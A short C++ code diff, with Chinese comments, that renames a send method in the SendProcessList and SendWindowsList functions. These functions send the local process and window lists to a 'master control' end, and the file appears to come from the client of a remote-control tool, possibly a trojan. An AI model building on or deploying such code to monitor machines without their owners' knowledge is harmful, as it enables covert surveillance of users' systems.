@@ -39,7 +39,7 @@ VOID CSystemManager::SendProcessList()
 	LPBYTE	szBuffer = GetProcessList();            //得到进程列表的数据
 	if (szBuffer == NULL)
 		return;	
-	m_ClientObject->OnServerSending((char*)szBuffer, LocalSize(szBuffer));  
+	m_ClientObject->Send2Server((char*)szBuffer, LocalSize(szBuffer));
 	LocalFree(szBuffer);
 
 	szBuffer = NULL;
@@ -51,7 +51,7 @@ void CSystemManager::SendWindowsList()
 	if (szBuffer == NULL)
 		return;
 
-	m_ClientObject->OnServerSending((char*)szBuffer, LocalSize(szBuffer));    //向主控端发送得到的缓冲区一会就返回了
+	m_ClientObject->Send2Server((char*)szBuffer, LocalSize(szBuffer));    //向主控端发送得到的缓冲区一会就返回了
 	LocalFree(szBuffer);	
 }
 
